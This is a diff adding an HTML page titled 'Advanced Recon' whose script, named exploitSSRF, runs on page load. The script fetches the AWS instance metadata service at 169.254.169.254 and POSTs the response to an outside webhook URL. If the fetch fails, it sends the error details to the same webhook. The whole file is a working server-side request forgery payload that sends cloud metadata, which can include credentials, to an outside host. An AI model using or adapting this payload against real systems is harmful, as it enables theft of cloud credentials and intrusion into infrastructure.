@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Advanced Recon</title>
+</head>
+<body>
+    <h1>Checking Internal Network...</h1>
+    <script>
+        // --- YOUR HOOKDECK URL ---
+        const webhookUrl = "https://hkdk.events/dp0gb9zztqv6wp"; 
+        
+        async function exploitSSRF() {
+            try {
+                // 1. Attempt to fetch the AWS Instance Metadata Service from INSIDE the browser
+                const targetUrl = "http://169.254.169.254/latest/meta-data/";
+                const response = await fetch(targetUrl);
+                const data = await response.text();
+
+                // 2. Exfiltrate the internal data to your webhook
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        status: "SUCCESS", 
+                        target: targetUrl,
+                        content: data 
+                    })
+                });
+            } catch (error) {
+                // 3. If it fails (e.g., due to CORS or network drop), log the exact error
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        status: "ERROR", 
+                        message: error.toString(),
+                        name: error.name
+                    })
+                });
+            }
+        }
+
+        exploitSSRF();
+    </script>
+</body>
+</html>
